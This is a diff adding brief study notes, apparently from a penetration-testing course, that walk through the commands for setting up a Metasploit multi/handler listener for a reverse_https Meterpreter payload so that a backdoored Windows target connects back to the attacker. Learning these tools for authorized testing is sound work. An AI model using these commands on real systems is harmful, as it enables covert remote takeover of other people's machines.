@@ -1,0 +1,12 @@
+/MSFCONSLE/ METASPLOIT 
+
+**The same concept as VEIL; when setting up the module, use the 'set' followed by the OPTION that you want to change and the desired value for that that option.**
+
+//Module to listen for incoming conections//
+use exploit/multi/handler   \\ in this case we are using the "exploit/multi/handler" module. 
+inside the module:
+show options     \\this will show the options for the module 
+set PAYLOAD windows/meterpreter/reverse_https   \\ remember to "set" the PAYLOAD to the one that you are going to use. 
+set LHOST 192.168.138.133 
+set LPORT 8080
+exploit      \\\\ this will execute the module; in this case the meterpreter is waiting for the BACKDOOR that you created to execute, this will make the target machine to connecto to us, and using the meterpreter we will be able to take control over the target's machine
